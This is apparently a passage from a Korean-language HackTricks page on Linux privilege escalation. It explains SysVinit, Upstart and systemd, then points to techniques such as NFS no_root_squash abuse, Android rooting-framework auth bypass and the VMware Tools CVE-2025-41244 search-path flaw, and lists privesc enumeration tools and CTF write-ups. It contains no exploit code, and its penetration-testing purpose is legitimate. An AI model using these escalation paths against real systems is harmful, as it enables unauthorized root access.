디렉터리 `/etc/init.d`는 **scripts**를 위한 공간으로, System V init(SysVinit), 즉 **기존 Linux service management system**을 위한 것입니다. 여기에는 서비스를 `start`, `stop`, `restart`, 때로는 `reload`하는 scripts가 포함됩니다. 이들은 직접 실행하거나 `/etc/rc?.d/`에 있는 심볼릭 링크를 통해 실행할 수 있습니다. Redhat 시스템의 대체 경로는 `/etc/rc.d/init.d`입니다.

반면 `/etc/init`는 **Upstart**와 관련이 있으며, Ubuntu가 도입한 더 새로운 **service management**로서 서비스 관리 작업에 configuration files를 사용합니다. Upstart로의 전환에도 불구하고, Upstart의 compatibility layer 때문에 SysVinit scripts는 Upstart configurations와 함께 여전히 사용됩니다.

**systemd**는 현대적인 initialization 및 service manager로 등장했으며, on-demand daemon starting, automount management, system state snapshots 같은 고급 기능을 제공합니다. 배포판 패키지는 파일을 `/usr/lib/systemd/`에, administrator modifications는 `/etc/systemd/system/`에 구성하여 system administration 과정을 단순화합니다.

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks는 일반적으로 syscall을 hook하여 privileged kernel functionality를 userspace manager에 노출합니다. 약한 manager authentication(예: FD-order 기반 signature checks 또는 부실한 password schemes)은 local app이 manager를 가장하고 이미 rooted된 devices에서 root로 escalation할 수 있게 합니다. 자세한 내용과 exploitation details는 여기에서 확인하세요:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

VMware Tools/Aria Operations의 regex-driven service discovery는 process command lines에서 binary path를 추출해 privileged context에서 -v와 함께 실행할 수 있습니다. permissive patterns(예: \S 사용)은 writable locations(예: /tmp/httpd)에 attacker-staged listeners를 매칭해 root로 execution하게 만들 수 있습니다(CWE-426 Untrusted Search Path).

자세한 내용과 다른 discovery/monitoring stacks에도 적용 가능한 일반화된 패턴은 여기에서 확인하세요:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Linux local privilege escalation vectors를 찾는 데 가장 좋은 tool:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** linux 및 MAC에서 kernel vulns를 열거 [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [0xdf – HTB Slonik (pg_basebackup cron copy → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [0xdf – HTB: Expressway](https://0xdf.gitlab.io/2026/03/07/htb-expressway.html)
- [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [PEP 3147 – PYC Repository Directories](https://peps.python.org/pep-3147/)
- [Python importlib docs](https://docs.python.org/3/library/importlib.html)

{{#include ../../banners/hacktricks-training.md}}
